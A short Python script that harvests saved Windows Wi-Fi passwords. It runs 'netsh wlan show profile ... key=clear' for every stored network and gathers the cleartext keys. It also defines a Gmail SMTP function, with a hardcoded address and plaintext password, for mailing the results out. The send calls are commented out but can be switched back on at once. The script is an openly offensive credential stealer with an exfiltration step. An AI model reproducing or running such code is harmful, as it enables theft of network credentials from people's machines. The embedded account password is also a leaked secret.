import subprocess,smtplib,re
email_default="jenniferjeanne123@gmail.com"
password_default="saurav12345"
def send_mail(email,password,message):
    server=smtplib.SMTP("smtp.gmail.com",587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,message)
    server.quit()


shellcommand="netsh wlan show profile"
network=subprocess.check_output(shellcommand, shell=True)
network=network.decode('utf-8')                                     # used to encode the byte to string
unique_pattern="(?:Profile\s*:\s)(.*)"                                               
network_names_list=re.findall(unique_pattern,network)
final_result=""
for network_name in network_names_list:
    command='netsh wlan show profile '+'"'+network_name + '"' + ' key=clear'
    #print(command)
    current_result=subprocess.check_output(command, shell="True")
    final_result=final_result+str(current_result)
    #print(final_result)

#f = open("demofile2.txt", "a")
#f.write(final_result)
#f.close()
#send_mail("jenniferjeanne123@gmail.com","saurav12345",str(final_result))
#send_mail(email_default,password_default,"hello")
